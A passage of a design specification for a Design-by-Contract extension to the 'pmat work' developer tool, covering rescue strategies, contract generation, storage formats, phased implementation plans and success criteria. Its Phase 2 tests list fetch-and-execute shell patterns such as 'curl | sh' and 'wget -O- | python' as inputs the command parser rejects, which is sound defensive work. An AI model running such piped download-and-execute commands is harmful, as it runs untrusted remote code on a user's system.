            Some(child_clause) => {
                match compare_thresholds(&parent_ensure.threshold, &child_clause.threshold) {
                    ThresholdComparison::Weakened => {
                        return Err(SubcontractingViolation::PostconditionWeakened {
                            clause: parent_ensure.id.clone(),
                            parent_threshold: parent_ensure.threshold.clone(),
                            child_threshold: child_clause.threshold.clone(),
                        });
                    }
                    ThresholdComparison::Incompatible => {
                        return Err(SubcontractingViolation::IncompatibleThresholds {
                            clause: parent_ensure.id.clone(),
                            parent_threshold: parent_ensure.threshold.clone(),
                            child_threshold: child_clause.threshold.clone(),
                        });
                    }
                    _ => {} // Strengthened or Equal: OK
                }
            }
        }
    }
    Ok(())
}
```

### 5.4 Example

```
$ pmat work start PMAT-500 --iteration 2

Inheriting postconditions from iteration 1:
  [ensure.absolute_coverage]  >= 99.59% (baseline: 99.59%)
  [ensure.tdg_regression]     >= 82.3

New postconditions for iteration 2:
  [ensure.absolute_coverage]  >= 99.65% (strengthened ✓)
  [ensure.mutation_score]     >= 80%    (new guarantee ✓)

Subcontracting validation: PASSED
  Postconditions: 2 inherited, 1 new, 0 dropped, 0 weakened
```

---

## 6. Rescue Protocol

Meyer §11 defines exception handling as rescue + retry, not defensive programming. When a postcondition violation occurs at `work complete`, the system enters a structured rescue state.

### 6.1 Rescue Strategies

Each `FalsificationMethod` has an associated rescue strategy:

```rust
pub enum RescueStrategy {
    /// Run coverage gap analysis, generate test stubs
    CoverageGapAnalysis,
    /// Run five-whys analysis, suggest refactoring
    FiveWhysAnalysis,
    /// Run dead code detection, suggest removal
    DeadCodeRemoval,
    /// Run SATD scan, list markers for resolution
    SatdResolution,
    /// Run complexity analysis, suggest extract-method
    ComplexityReduction,
    /// No automated rescue available
    ManualIntervention { guidance: String },
}
```

| Postcondition | Rescue Strategy | Tool |
|---------------|----------------|------|
| `AbsoluteCoverage` | `CoverageGapAnalysis` | `pmat query --coverage-gaps` |
| `DifferentialCoverage` | `CoverageGapAnalysis` | `pmat query --coverage-gaps` |
| `TdgRegression` | `FiveWhysAnalysis` | `pmat five-whys` |
| `ComplexityRegression` | `ComplexityReduction` | `pmat analyze complexity` |
| `SatdDetection` | `SatdResolution` | `pmat analyze satd` |
| `DeadCodeDetection` | `DeadCodeRemoval` | `pmat analyze dead-code` |
| `SupplyChainIntegrity` | `ManualIntervention` | `cargo audit` |
| `PerFileCoverage` | `CoverageGapAnalysis` | `pmat query --coverage-gaps` |

### 6.2 Rescue Flow

```
Postcondition violated → Rescue state → One remediation attempt → Re-verify → Pass or Escalate

                    ┌──────────────┐
                    │  ensure.X    │
                    │  VIOLATED    │
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   RESCUE     │  Diagnose + attempt fix
                    │  (1 attempt) │
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   RETRY      │  Re-evaluate postcondition
                    └──────┬───────┘
                      ┌────┴────┐
                      │         │
                 ┌────▼───┐ ┌──▼──────┐
                 │  PASS  │ │  FAIL   │  Escalate to developer
                 │ (done) │ │ (abort) │  with diagnosis
                 └────────┘ └─────────┘
```

### 6.3 Rescue Output

```
$ pmat work complete PMAT-500

POSTCONDITION VIOLATION: ensure.absolute_coverage
  Required: >= 99.59%
  Actual:   99.41%
  Delta:    -0.18%

RESCUE: CoverageGapAnalysis
  Scanning for coverage gaps in modified files...
  Found 3 uncovered functions:
    1. src/services/repo_score/patterns.rs:matches_pattern (12 lines uncovered)
    2. src/services/repo_score/large_files.rs:check_file_exists (4 lines uncovered)
    3. src/cli/handlers/score_handlers.rs:format_category (8 lines uncovered)

  Generating test stubs → .pmat-work/PMAT-500/rescue/coverage_tests.rs

  Action required:
    1. Review generated test stubs
    2. Move to appropriate test module
    3. Run: pmat work complete PMAT-500

RESCUE COMPLETE (manual action required — 1 attempt used)
```

### 6.4 Rescue Limits

- **One automatic attempt per postcondition per completion**. After rescue, the developer must act.
- Rescue never modifies source code directly — it only generates diagnostics and stubs.
- Rescue results are recorded in the falsification receipt for audit.

### 6.5 Rescue Availability by Profile

| Profile | Rescue enabled | Strategies available |
|---------|:--------------:|---------------------|
| Universal | No (opt-in) | `ManualIntervention` only — prints guidance |
| Rust | No (opt-in) | `ManualIntervention`, `ComplexityReduction` (via tree-sitter) |
| Pmat | Yes (default) | All strategies (coverage gaps, five-whys, SATD, dead code, etc.) |
| Custom | Configurable | Only strategies whose backing tools are installed |

Non-Pmat projects can opt into rescue via `.pmat-work/config.toml`:

```toml
[dbc.rescue]
enabled = true
```

When rescue is disabled, postcondition failures produce a structured diagnostic message (clause ID, expected vs actual, suggested manual steps) but do not invoke any external tools.

---

## 7. Contract Generation

### 7.1 Profile-Aware Generation

`WorkContract::with_dbc()` detects the project profile and generates only the applicable claims:

```rust
impl WorkContract {
    pub fn with_dbc(
        work_item_id: String,
        baseline_commit: String,
        project_path: &Path,
        without: &[String],         // Explicit exclusions via --without
    ) -> Result<Self, ContractError> {
        let profile = ContractProfile::detect(project_path);
        let config = DbcConfig::load(project_path);
        let profile = config.profile_override.unwrap_or(profile);

        // Phase 1: Generate claims for profile
        let claims = Self::claims_for_profile(&profile, &config);
        let (require, ensure, invariant) = Self::classify_claims(&claims);

        // Phase 2: Verify toolchain (fail-fast, no silent skipping)
        let missing = Self::check_toolchain(&profile, project_path);
        if !missing.is_empty() {
            return Err(ContractError::MissingTools {
                profile: profile.name(),
                missing,
                suggestion: format!(
                    "Install missing tools, downgrade with --profile universal, \
                     or exclude with --without {}",
                    missing.iter().map(|m| &m.claim_id).collect::<Vec<_>>().join(",")
                ),
            });
        }

        // Phase 3: Apply explicit exclusions (developer intent, recorded)
        let (require, excluded_r) = Self::apply_exclusions(require, without);
        let (ensure, excluded_e) = Self::apply_exclusions(ensure, without);
        let (invariant, excluded_i) = Self::apply_exclusions(invariant, without);
        let excluded = [excluded_r, excluded_e, excluded_i].concat();

        Ok(Self {
            work_item_id,
            baseline_commit,
            profile,
            require,
            ensure,
            invariant,
            excluded_claims: excluded,  // Visible in contract JSON
            claims: vec![],
            iteration: 1,
            inherited_postconditions: vec![],
            thresholds: config.thresholds,
        })
    }

    /// Verify all tools required by the profile are installed.
    /// Returns empty Vec if all present, or list of missing tools.
    fn check_toolchain(
        profile: &ContractProfile,
        project_path: &Path,
    ) -> Vec<MissingTool> {
        let required = profile.required_tools();
        required.into_iter()
            .filter(|tool| !tool.is_available(project_path))
            .collect()
    }

    /// Remove explicitly excluded claims. Records each exclusion with reason.
    fn apply_exclusions(
        clauses: Vec<ContractClause>,
        without: &[String],
    ) -> (Vec<ContractClause>, Vec<ExcludedClaim>) {
        let (excluded, active): (Vec<_>, Vec<_>) = clauses.into_iter()
            .partition(|c| without.contains(&c.id));
        let excluded = excluded.into_iter()
            .map(|c| ExcludedClaim {
                id: c.id,
                reason: "developer_excluded".to_string(),
            })
            .collect();
        (active, excluded)
    }
}
```

### 7.2 Universal Claims (git-only projects)

Minimal set requiring only `git` and a build/test command:

```rust
fn universal_claims(config: &DbcConfig) -> Vec<FalsifiableClaim> {
    vec![
        // Require
        claim("require.compiles", "Project builds successfully"),
        claim("require.tests_exist", "At least one test exists"),
        // Invariant
        claim("invariant.compiles", "Project compiles at every checkpoint"),
        claim("invariant.file_size", &format!("No file exceeds {} lines", config.max_file_lines)),
        // Ensure
        claim("ensure.tests_pass", "All tests pass"),
        claim("ensure.git_sync", "All changes pushed to remote"),
        // NOTE: ensure.no_regression requires structured test output (test names + pass/fail)
        // which arbitrary build systems can't provide. Only available in Rust+ profiles
        // where `cargo test` provides machine-parseable output.
    ]
}
```

Build/test commands are detected from project structure:

| Detected file | Build command | Test command |
|---------------|--------------|--------------|
| `Cargo.toml` | `cargo check` | `cargo test` |
| `package.json` | `npm run build` | `npm test` |
| `go.mod` | `go build ./...` | `go test ./...` |
| `pyproject.toml` / `setup.py` | `python -m build` | `pytest` |
| `Makefile` | `make build` | `make test` |
| `Justfile` | `just build` | `just test` |

Override via `.pmat-work/config.toml`:

```toml
[dbc.commands]
build = "bazel build //..."
test = "bazel test //..."
lint = "buildifier --lint=warn"
```

### 7.3 Inferred Contracts (Future — Phase 3)

AST diff analysis at checkpoint time can infer additional contract clauses. Note: this inference is **decidable by construction** — it uses syntactic pattern matching on AST nodes (validation calls, return type changes), not semantic analysis or theorem proving. Every inference rule terminates in O(n) over the diff hunks.

```rust
pub fn infer_clauses_from_diff(
    diff: &GitDiff,
    index: &AgentContextIndex,
) -> Vec<ContractClause> {
    let mut clauses = vec![];

    for hunk in &diff.hunks {
        // New validation/assertion → infer precondition
        if hunk.added_lines.iter().any(|l| is_validation_pattern(l)) {
            clauses.push(ContractClause {
                kind: ClauseKind::Require,
                source: ClauseSource::Inferred { diff_sha: diff.sha.clone() },
                // ...
            });
        }

        // New return type / error variant → infer postcondition
        if hunk.added_lines.iter().any(|l| is_result_type_change(l)) {
            clauses.push(ContractClause {
                kind: ClauseKind::Ensure,
                source: ClauseSource::Inferred { diff_sha: diff.sha.clone() },
                // ...
            });
        }
    }

    clauses
}
```

**Phase 4+ research direction**: Beyond deterministic AST patterns, LLM-based contract inference (as demonstrated by "Beyond Postconditions" [Ref 8]) could infer richer preconditions and invariants from natural language commit messages and code context. This is distinct from the Phase 3 approach: Phase 3 is syntactic, decidable, and reproducible; LLM-based inference would be probabilistic and require confidence thresholds before promoting inferred clauses to active contract terms.

---

## 8. Storage Format

### 8.1 Contract JSON (v5.0)

```json
{
  "version": "5.0",
  "work_item_id": "PMAT-500",
  "created_at": "2026-02-26T10:00:00Z",
  "baseline_commit": "abc123def",
  "iteration": 1,

  "require": [
    {
      "id": "require.manifest_integrity",
      "kind": "Require",
      "description": "All baseline files must exist",
      "falsification_method": "ManifestIntegrity",
      "threshold": null,
      "blocking": true,
      "source": "Default"
    }
  ],

  "ensure": [
    {
      "id": "ensure.absolute_coverage",
      "kind": "Ensure",
      "description": "Total coverage >= 95%",
      "falsification_method": "AbsoluteCoverage",
      "threshold": {
        "Numeric": { "metric": "coverage_pct", "op": "Gte", "value": 95.0 }
      },
      "blocking": true,
      "source": "Default"
    }
  ],

  "invariant": [
    {
      "id": "invariant.complexity",
      "kind": "Invariant",
      "description": "No function exceeds complexity 20",
      "falsification_method": "ComplexityRegression",
      "threshold": {
        "Numeric": { "metric": "max_complexity", "op": "Lte", "value": 20.0 }
      },
      "blocking": true,
      "source": "Default"
    }
  ],

  "inherited_postconditions": [],

  "claims": [
    "... existing 22 FalsifiableClaim entries for backward compat ..."
  ],

  "baseline_tdg": 82.3,
  "baseline_coverage": 99.59,
  "baseline_rust_score": 78.0,
  "baseline_file_manifest": { "..." : "..." },
  "thresholds": { "..." : "..." }
}
```

### 8.2 Checkpoint Record

```json
{
  "checkpoint_id": "uuid-v7",
  "work_item_id": "PMAT-500",
  "timestamp": "2026-02-26T12:30:00Z",
  "git_sha": "def456abc",
  "iteration": 1,
  "invariant_results": [
    {
      "clause_id": "invariant.complexity",
      "passed": true,
      "evidence": { "Numeric": { "actual": 18.0, "threshold": 20.0 } }
    }
  ],
  "all_invariants_hold": true
}
```

### 8.3 Rescue Record

```json
{
  "rescue_id": "uuid-v7",
  "work_item_id": "PMAT-500",
  "timestamp": "2026-02-26T14:00:00Z",
  "violated_clause": "ensure.absolute_coverage",
  "strategy": "CoverageGapAnalysis",
  "diagnosis": {
    "gap_count": 3,
    "uncovered_functions": ["matches_pattern", "check_file_exists", "format_category"],
    "generated_stubs": ".pmat-work/PMAT-500/rescue/coverage_tests.rs"
  },
  "outcome": "ManualActionRequired",
  "retry_allowed": true
}
```

### 8.4 Updated Directory Layout

```
.pmat-work/
├── {item-id}/
│   ├── contract.json              # v5.0 with require/ensure/invariant
│   ├── checkpoints/               # NEW: invariant evaluation records
│   │   ├── checkpoint-2026-02-26T12-30-00Z.json
│   │   └── checkpoint-2026-02-26T14-00-00Z.json
│   ├── rescue/                    # NEW: rescue diagnostics and stubs
│   │   ├── rescue-2026-02-26T14-00-00Z.json
│   │   └── coverage_tests.rs      # Generated test stubs
│   └── falsification/             # Existing: completion receipts
│       └── receipt-2026-02-26T15-00-00Z.json
└── ledger.jsonl                   # Existing: global audit log
```

---

## 9. Implementation Plan

### Phase 1: Contract Profiles + Meyer Triad (1.5 weeks)

**Goal**: Add profile detection, triad classification, and precondition gating. External projects work with Universal/Rust profiles from day one.

1. Add `ContractProfile`, `ContractClause`, `ClauseKind`, `ClauseSource`, `ClauseThreshold` types
2. Add `DbcConfig` struct for `.pmat-work/config.toml` parsing
3. Implement `ContractProfile::detect(project_path)` — auto-detect from project files
4. Implement `claims_for_profile()` — generate Universal (7), Rust (14), or Pmat (25) claim sets
5. Implement `classify_claims()` — sort claims into require/ensure/invariant
6. Implement `filter_available()` — skip claims whose tools are missing (graceful degradation)
7. Add `require`, `ensure`, `invariant`, `profile`, `skipped_claims` fields to `WorkContract`
8. Update `WorkContract::new()` to call `with_dbc()` with profile awareness
9. Update `work start` to evaluate `require` clauses and reject if any fail
10. Update contract JSON serialization to v5.0 format (backward-compatible: retain `claims` field)
11. Update display output to show profile name and triad grouping

**Files modified**:
- New: `src/cli/handlers/work_contract_profile.rs` — ContractProfile, DbcConfig, detection logic
- `src/cli/handlers/work_contract_core.rs` — Add triad fields, classify_claims()
- `src/cli/handlers/work_contract_falsification.rs` — Add ClauseKind, ContractClause
- `src/cli/handlers/work_handlers/core_handlers/handlers.rs` — Precondition check at start
- `src/cli/handlers/work_handlers/core_handlers/contract.rs` — Profile-aware generation

**Tests**:
- Auto-detection: Cargo.toml → Rust, .pmat/ → Pmat, git-only → Universal
- Config override: `profile = "universal"` forces Universal even with Cargo.toml
- Universal profile: 7 claims, requires only git
- Rust profile: 14 claims, requires cargo + clippy + llvm-cov + cargo-audit
- Pmat profile: 25 claims (superset of existing 22 + 3 new universal claims)
- Toolchain precondition: missing cargo-llvm-cov → work start BLOCKED (not skipped)
- `--without ensure.coverage`: explicit exclusion recorded in contract, work start proceeds
- `--profile universal`: downgrade from Rust, fewer toolchain requirements
- v4.0 backward compat: loading old contract auto-classifies into triad
- Precondition failure blocks work start

### Phase 2: Stack Manifests + Security Model (1.5 weeks)

**Goal**: Third-party teams can define `.dbc-stack.toml` with custom claims, tools, and rescue strategies. All command execution gated by TOFU trust model.

1. Add `StackManifest` parser for `.dbc-stack.toml` format
2. Implement command restriction parser — reject pipe-to-shell, backtick substitution, `$()`, network-fetch-then-execute patterns
3. Implement `pmat work trust-stack` command — display all commands, prompt confirmation, record content hash in `.pmat-work/trusted-stacks.json`
4. Implement trust invalidation — detect manifest content change, re-prompt with diff of changed commands
5. Implement `Command::new()`-based execution (argument splitting, no `sh -c`)
6. Implement `&&` chaining handler (sequential, short-circuit on failure)
7. Implement `metric_pattern` regex extraction for threshold comparison
8. Implement `extends` inheritance (merge parent profile claims with stack claims)
9. Implement stack-defined `[[rescue]]` blocks (shell command or manual guidance)
10. Implement toolchain verification at trust time (extract tool names from commands, check PATH)
11. Add `Stack { manifest }` variant to `ContractProfile`
12. Add `.dbc-stack.toml` detection to auto-detect logic

**Files modified**:
- New: `src/cli/handlers/work_contract_stack.rs` — StackManifest parser, command restriction validation
- New: `src/cli/handlers/work_trust.rs` — Trust model, TOFU flow, content hash tracking
- `src/cli/handlers/work_contract_profile.rs` — Stack detection, extends resolution
- `src/cli/commands/work_commands*.rs` — `trust-stack` subcommand

**Tests**:
- Parse valid `.dbc-stack.toml` with require/invariant/ensure blocks
- Command restriction: reject `curl | sh`, backtick, `$()`, `wget -O- | python`
- Command restriction: allow `go build ./...`, `&&` chains, `2>&1`, `$GOPATH`
- Trust TOFU: untrusted manifest blocks work start with command listing
- Trust invalidation: modified manifest re-prompts with diff
- Trust persistence: trusted manifest with matching hash proceeds without prompt
- Toolchain verification: missing tool blocks trust
- Shell check: exit 0 → pass, exit 1 → fail
- Metric extraction: regex captures numeric value from stdout
- Extends: "rust" + 2 custom claims = 16 total
- Extends: "universal" + Go tools = correct claim set
- Invalid manifest: missing `check` field → parse error
- Timeout: slow check killed after `timeout` seconds
- Rescue: shell rescue runs command, manual rescue prints guidance

### Phase 3: Invariant Checkpoints + Subcontracting (1 week)

**Goal**: `pmat work checkpoint` evaluates invariant clauses. Multi-iteration work enforces monotonic postcondition strengthening.

1. Add `CheckpointRecord` struct to `work_ledger_types.rs`
2. Add `checkpoints/` directory creation in contract setup
3. Implement invariant evaluation in `handle_work_checkpoint()`
4. For Stack profiles: run shell commands for invariant claims
5. Record checkpoint results to JSON
6. Track accumulated invariant violations (block completion if any checkpoint failed)
7. Add `iteration` and `inherited_postconditions` fields to `WorkContract`
8. Implement `validate_subcontracting()` — verify child postconditions >= parent
9. Update `work start --iteration N` to load parent contract, inherit postconditions
10. Update `work status` to show checkpoint history and invariant health

**Files modified**:
- `src/cli/handlers/work_ledger_types.rs` — Add CheckpointRecord
- `src/cli/handlers/work_handlers/core_handlers/handlers.rs` — Checkpoint + iteration handling
- `src/cli/handlers/work_contract_core.rs` — Subcontracting validation
- `src/cli/commands/work_commands*.rs` — `checkpoint` subcommand, `--iteration` flag

**Tests**:
- Invariant pass → checkpoint recorded (all profiles)
- Invariant fail → checkpoint rejected, violation recorded
- Shell-command invariant: evaluated via stack manifest
- Accumulated violations block completion
- Subcontracting: postcondition strengthening accepted
- Subcontracting: postcondition weakening rejected
- Subcontracting: new postconditions accepted
- Subcontracting: applies to Stack profiles too (inherited claims)

### Phase 4: Rescue Protocol (1 week)

**Goal**: Structured rescue on postcondition failure. Pmat profile gets full rescue; other profiles get shell-based or manual rescue.

1. Add `RescueStrategy` enum and `RescueRecord` struct
2. For Pmat profile: map `FalsificationMethod` → built-in rescue strategies
3. For Stack profile: use `[[rescue]]` blocks from manifest (shell or manual)
4. For Universal/Rust: manual intervention only (unless rescue opted in via config)
5. Implement rescue dispatch in `handle_work_complete()`
6. Implement `CoverageGapAnalysis` rescue (Pmat: `pmat query --coverage-gaps`)
7. Implement shell-command rescue (Stack: run `command` from manifest)
8. Generate rescue records to `.pmat-work/{id}/rescue/`
9. Record rescue attempts in falsification receipt

**Files modified**:
- New: `src/cli/handlers/work_rescue.rs` — Rescue strategies and dispatch
- `src/cli/handlers/work_handlers/core_handlers/handlers.rs` — Rescue integration
- `src/cli/handlers/work_ledger_types.rs` — RescueRecord
- `src/cli/handlers/work_falsification/runner.rs` — Rescue hooks

**Tests**:
- Pmat rescue: coverage gap analysis generates correct output
- Stack rescue: shell command executed, output captured
- Manual rescue: guidance message printed, no tool invoked
- Rescue disabled: postcondition failure aborts immediately with diagnostics
- Rescue limited to one attempt per clause per completion
- Rescue results recorded in receipt

---

## 10. Batuta Stack Integration (Opt-In — Pmat Profile Only)

All integrations in this section are **opt-in** and only activate for the `Pmat` profile (or `Custom` profiles that explicitly request them). External projects using `Universal` or `Rust` profiles are completely unaffected. No batuta crate is a build dependency of the DbC core — integrations are runtime-dispatched via tool detection.

### 10.1 probar (Property-Based Testing)

Generate property tests from ensure clauses:

```rust
// For ensure.absolute_coverage >= 95.0:
proptest! {
    #[test]
    fn prop_coverage_never_regresses(delta in -5.0f64..5.0) {
        let baseline = 99.59;
        let actual = baseline + delta;
        if actual >= 95.0 {
            prop_assert!(postcondition_holds(actual, 95.0));
        }
    }
}
```

**Integration point**: `pmat work start` can optionally generate probar property tests from contract clauses into `.pmat-work/{id}/generated_tests/`.

### 10.2 renacer (Golden Tracing)

Capture before/after execution traces as postcondition oracles:

```toml
# renacer.toml
[[scenarios]]
name = "work_complete_PMAT-500"
capture_before = true
capture_after = true
validate_no_behavioral_regression = true
```

**Integration point**: `work complete` invokes `renacer validate` as part of the existing trace gate. Traces become ensure clauses: "behavior must match golden trace."

### 10.3 certeza (Quality Validation)

certeza validates the *contract itself*:

```bash
certeza check-contract .pmat-work/PMAT-500/contract.json
  ✓ All clauses are falsifiable
  ✓ Thresholds are achievable (not contradictory)
  ✓ Subcontracting rules hold
  ✓ No orphaned inherited postconditions
```

### 10.4 aprender (ML-Based Inference)

Future: aprender's similarity engine could suggest contract clauses based on historical work patterns:

```
Similar work items (by TF-IDF on issue description):
  PMAT-412: coverage dropped 2% → added ensure.differential_coverage
  PMAT-389: complexity spike    → added invariant.complexity at 15

Suggested additional clauses:
  [ensure.differential_coverage] >= baseline (high confidence: 0.87)
```

---

## 11. Backward Compatibility

### 11.1 Contract Version Migration

| Version | Format | Behavior |
|---------|--------|----------|
| v4.0 (current) | Flat claims list | All checked at completion |
| v5.0 (new) | Triad + flat claims | Require at start, invariant at checkpoint, ensure at completion |

**Migration**: `WorkContract::load()` detects version. v4.0 contracts are auto-classified into the triad using `classify_claims()`. No manual migration required.

### 11.2 CLI Compatibility

| Command | Current | New |
|---------|---------|-----|
| `pmat work start` | Creates flat contract | Creates triad contract, evaluates require |
| `pmat work continue` | Shows status | Unchanged |
| `pmat work checkpoint` | Not implemented | **NEW**: Evaluates invariants |
| `pmat work falsify` | Runs all 22 claims | Runs all 22 claims (unchanged) |
| `pmat work complete` | Gate on all claims | Gate on require + invariant + ensure, with rescue |
| `pmat work status` | Shows progress | Shows progress + triad health + checkpoint history |

### 11.3 Ledger Compatibility

Existing ledger entries are unaffected. New entries include `contract_version: "5.0"` field. Ledger remains append-only.

### 11.4 Concurrent Work Items (Known Limitation)

Contracts are scoped per work item (`.pmat-work/{item-id}/`). When two developers run concurrent work items that modify overlapping files, their invariant evaluations are independent — Developer A's checkpoint does not see Developer B's contract, and vice versa. This means:

- **No cross-item invariant conflicts**: each contract evaluates only its own claims against the current working tree state. This is correct behavior — each work item tracks its own quality obligations.
- **File-level invariant overlap is possible**: if Developer A's contract has `invariant.complexity <= 20` and Developer B adds a function with complexity 18 to the same file, Developer A's next checkpoint may see a different complexity landscape than when they started. This is a standard merge-time concern, not a DbC defect.
- **Resolution**: merge conflicts are resolved at git merge time, not at contract time. After merge, each developer's `work complete` re-evaluates postconditions against the merged state. If the merge introduced a regression, the postcondition catches it.

---

## 12. Success Criteria

1. **All existing tests pass** — zero behavioral regression
2. **Profile auto-detection works** — Cargo.toml → Rust, .pmat/ → Pmat, git-only → Universal
3. **Universal profile works with git only** — no cargo, pmat, or batuta dependency
4. **Stack manifests parse and execute** — third-party `.dbc-stack.toml` drives claim evaluation
5. **Toolchain preconditions enforced** — missing tools BLOCK work start, no silent skipping
6. **`--without` exclusions recorded** — explicit exclusions visible in contract JSON, auditable
7. **Stack TOFU security** — untrusted manifests display all commands, require explicit confirmation
8. **Command restrictions enforced** — pipe-to-shell, backtick, `$()` patterns rejected at parse time
9. **Trust invalidation works** — modified manifest re-prompts with command diff
10. **Claims correctly classified** — require at start, invariant at checkpoint, ensure at completion
11. **Precondition failure blocks work start** — no defensive fix-up
12. **Invariant failure blocks checkpoint** — violation recorded
13. **Postcondition failure triggers rescue** — one attempt, then escalate (Pmat/Stack)
14. **Subcontracting enforced** — monotonic postcondition strengthening across iterations
15. **v4.0 contracts auto-migrate** — no manual intervention
16. **Coverage >= 95%** on all new code
17. **External project smoke test** — run DbC on a Go project with `.dbc-stack.toml`, verify full lifecycle
18. **Security smoke test** — verify malicious manifest patterns are rejected at parse time and trust time
19. **Contract quality score >= 0.7** — see contract quality metric below

### 12.1 Contract Quality Metric

A contract that passes all claims is not necessarily a *good* contract — a contract with most claims excluded via `--without` is technically valid but weak. To close this gap (motivated by VerifyThisBench [Ref 10]), we define a **contract quality score**:

```
contract_quality = active_claims / applicable_claims
```

Where:
- `applicable_claims` = total claims the detected profile would generate (e.g., 14 for Rust, 25 for Pmat)
- `active_claims` = applicable minus excluded (via `--without`)
- Score range: 0.0 (all excluded) to 1.0 (no exclusions)

| Score | Rating | Interpretation |
|-------|--------|----------------|
| 1.0 | Full | All applicable claims active — maximum contract strength |
| 0.8–0.99 | Strong | Minor exclusions (e.g., `--without ensure.formal_proofs`) |
| 0.5–0.79 | Partial | Significant exclusions — investigate if toolchain gaps can be closed |
| < 0.5 | Weak | More claims excluded than active — consider downgrading profile |

The contract quality score is:
- **Recorded** in `contract.json` as `contract_quality: f64`
- **Displayed** by `pmat work status` alongside triad health
- **Checked** at completion: `work complete` warns (non-blocking) if quality < 0.7
- **Auditable** in the ledger: teams can track contract quality trends over time

This metric answers "are we writing good contracts?" — not just "do our contracts pass?"

---

## 13. References

1. Meyer, B. (1992). "Applying Design by Contract." *IEEE Computer*, 25(10), 40-51.
2. Popper, K. (1934). *The Logic of Scientific Discovery*. Routledge.
3. Liskov, B. & Wing, J. (1994). "A Behavioral Notion of Subtyping." *ACM TOPLAS*, 16(6).
4. Ohno, T. (1988). *Toyota Production System: Beyond Large-Scale Production*. Productivity Press.
5. PAIML (2025). "Popper Falsifiability Score Specification v1.1." Internal.
6. PAIML (2025). "Master Plan: PMAT Unified Work System v1.0." Internal.
7. Cheng, Y. et al. (2025). "ContractEval: Evaluating Contract-Satisfying Assertions in LLM Code Generation." *arXiv:2510.12047*. — Validates that static threshold comparison (Section 5.2) is a lightweight form of SMT-based contract verification.
8. Endres, M. et al. (2025). "Beyond Postconditions: LLMs Inferring Formal Contracts for Automatic Software Verification." *arXiv:2510.12702*. — Demonstrates LLM-based precondition/postcondition/invariant inference; informs Phase 3+ research directions (Section 7.3).
9. Gu, L. et al. (2025). "AgentSpec: Customizable Runtime Enforcement for LLM Agents." *arXiv:2503.18666*. — AgentSpec's trigger/predicate/enforcement model independently validates the claim structure (ClauseKind/FalsificationMethod/blocking+rescue) in this spec.
10. Mugnier, S. et al. (2025). "VerifyThisBench: Generating Verified Code, Specs, and Proofs with LLMs." *arXiv:2505.19271*. — Supports co-generation of contracts alongside work items rather than retrofitting; motivates contract quality metrics.
11. Tolmach, P. et al. (2025). "Formal Verification in Solidity and Move." *arXiv:2502.13929*. — Confirms invariant checking at transaction boundaries (checkpoint model) as the standard approach in contract verification.
